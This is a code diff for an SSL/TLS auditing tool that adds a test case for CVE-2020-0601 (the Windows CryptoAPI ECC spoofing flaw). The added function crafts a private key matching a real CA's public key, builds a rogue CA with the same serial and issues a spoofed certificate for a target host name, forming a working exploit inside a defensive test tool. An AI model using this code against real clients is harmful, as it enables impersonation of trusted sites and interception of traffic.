@@ -2,6 +2,8 @@
 #include "ssltests.h"
 #include "sslcertgen.h"
 #include "debug.h"
+#include "openssl-helper.h"
+#include "cve-2020-0601_poc.h"
 
 #ifdef UNSAFE_QSSL
 #include "sslunsafeconfiguration.h"
@@ -50,6 +52,7 @@ void fillSslTestsFactory()
         ADD_SSLTEST_CASE(SslTestCiphersDtls12Exp);
         ADD_SSLTEST_CASE(SslTestCiphersDtls12Low);
         ADD_SSLTEST_CASE(SslTestCiphersDtls12Med);
+        ADD_SSLTEST_CASE(SslTestCertCve20200601);
 
         case SslTestId::SslTestNonexisting:
             break;
@@ -408,4 +411,153 @@ bool SslTestCiphersDtls12Low::setProtoAndCiphers()
 bool SslTestCiphersDtls12Med::setProtoAndCiphers()
 {
     return setProtoAndMediumCiphers(XSsl::DtlsV1_2);
+}
+
+bool SslTestCertCve20200601::prepare(const SslUserSettings &settings)
+{
+    XSslCertificate caCert;
+    QByteArray caSN;
+    QByteArray caPubKey;
+    QString targetCN;
+    bool ret = false;
+
+    // if user provided CA cert, use it as a base one
+    QList<XSslCertificate> chain = settings.getUserCaCert();
+    if (chain.size() == 0) {
+        // ok, no CA cert, may be remote server is provided?
+        if (settings.getServerAddr().length() != 0) {
+            // assume that CA will be last in the list
+            caCert = settings.getPeerCertificates().last();
+            // get common name of the host
+            targetCN = settings.getPeerCertificates().first().subjectInfo(XSslCertificate::CommonName).first();
+        }
+    } else {
+        caCert = chain.at(0);
+    }
+
+    if (caCert.isNull()) {
+        VERBOSE("\tCVE-2020-0601: no CA certificate provided");
+        return false;
+    }
+
+    // CA has to be self-signed
+    if (!caCert.isSelfSigned()) {
+        VERBOSE("\tCVE-2020-0601: the provided certificate is not a CA");
+        return false;
+    }
+
+    // check if the certificate is signed using ECC
+    if (caCert.publicKey().algorithm() != XSsl::Ec) {
+        VERBOSE("\tCVE-2020-0601: the provided CA certificate is not signed using ECC");
+        return false;
+    }
+
+    // extract raw public key and serial number of the provided certificate
+    caSN.resize(8192);
+    size_t caSNLen = 0;
+    getCertSerial(caCert.toPem().constData(), caCert.toPem().size(),
+                  (unsigned char *)caSN.data(), 8192, &caSNLen,
+                  true);
+    caSN.resize(caSNLen);
+
+    caPubKey.resize(8192);
+    size_t caPubKeyLen = 0;
+    ret = getCertPublicKey(caCert.toPem().constData(), caCert.toPem().size(),
+                           (unsigned char *)caPubKey.data(), &caPubKeyLen,
+                           true);
+    if (!ret) {
+        VERBOSE("\tCVE-2020-0601: failed to extract public key");
+        return false;
+    }
+
+    caPubKey.resize(caPubKeyLen);
+
+    // decide what target common name to use
+    if (settings.getUserCN().size() > 0) {
+        targetCN = settings.getUserCN();
+    }
+    if (targetCN.size() == 0) {
+        targetCN = "www.example.com";
+    }
+
+    // input data is ready now we can craft evil certificates
+
+    // craft evil private key which generates the desired public key
+    char evilPrivKeyPKCS8[16384];
+    size_t evilPrivKeyPKCS8Len;
+    ret = craftEvilPrivKey(caPubKey.constData(), caPubKey.size(),
+                           evilPrivKeyPKCS8, sizeof(evilPrivKeyPKCS8), &evilPrivKeyPKCS8Len,
+                           false, NULL);
+    if (!ret) {
+        VERBOSE("\tCVE-2020-0601: failed to craft evil private key");
+        return false;
+    }
+
+    // convert this private key to PEM format
+    char evilPrivKeyPem[16384];
+    size_t evilPrivKeyPemLen;
+    ret = pkcs8PrivKeyToPem(evilPrivKeyPKCS8, evilPrivKeyPKCS8Len,
+                            evilPrivKeyPem, sizeof(evilPrivKeyPem), &evilPrivKeyPemLen,
+                            false, NULL);
+    if (!ret) {
+        VERBOSE("\tCVE-2020-0601: failed to convert evil private key to PEM");
+        return false;
+    }
+
+    // create our rogue CA with the same serial number as the original one
+    // sign it with evil private key
+    unsigned char evilCaCert[16384];
+    size_t evilCaCertLen;
+    ret = genSignedCaCertWithSerial(caSN.constData(),
+                                    (const char *)evilPrivKeyPem, evilPrivKeyPemLen,
+                                    evilCaCert, sizeof(evilCaCert), &evilCaCertLen,
+                                    false, NULL);
+    if (!ret) {
+        VERBOSE("\tCVE-2020-0601: failed to sign custom CA");
+        return false;
+    }
+
+    // generate a certificate for the provided common name which is signed by the evil CA
+    unsigned char hostCert[8192];
+    size_t hostCertLen;
+    unsigned char hostKey[8192];
+    size_t hostKeyLen;
+    ret = genSignedCertForCN(targetCN.toLocal8Bit().constData(),
+                             (const char *)evilCaCert, evilCaCertLen,
+                             (const char *)evilPrivKeyPem, evilPrivKeyPemLen,
+                             hostKey, sizeof(hostKey), &hostKeyLen,
+                             hostCert, sizeof(hostCert), &hostCertLen,
+                             false, NULL, NULL);
+    if (!ret) {
+        VERBOSE("\tCVE-2020-0601: failed to generate certificate for target common name");
+        return false;
+    }
+
+    // we have certificates and keys in raw format, convert them to Qt types
+    XSslCertificate evilCaCertQt(QByteArray::fromRawData((const char *)evilCaCert, evilCaCertLen),
+                                 XSsl::Pem);
+    XSslCertificate hostCertQt(QByteArray::fromRawData((const char *)hostCert, hostCertLen),
+                               XSsl::Pem);
+    XSslKey hostKeyQt(QByteArray::fromRawData((const char *)hostKey, hostKeyLen),
+                      XSsl::Ec, XSsl::Pem, XSsl::PrivateKey);
+
+    if (evilCaCertQt.isNull() || hostCertQt.isNull() || hostKeyQt.isNull()) {
+        VERBOSE("\tCVE-2020-0601: failed to switch to Qt types");
+        return false;
+    }
+
+    // finally, fill class members with crafted certificates
+    m_localCertsChain << hostCertQt;
+    m_localCertsChain << evilCaCertQt; // providing CA is obligatory
+    m_privateKey = hostKeyQt;
+
+    m_sslCiphers = XSslConfiguration::supportedCiphers();
+    // DTLS mode requires specific protocol to be set
+    if (settings.getUseDtls()) {
+        m_sslProtocol = XSsl::DtlsV1_0OrLater;
+    } else {
+        m_sslProtocol = XSsl::AnyProtocol;
+    }
+
+    return true;
 }
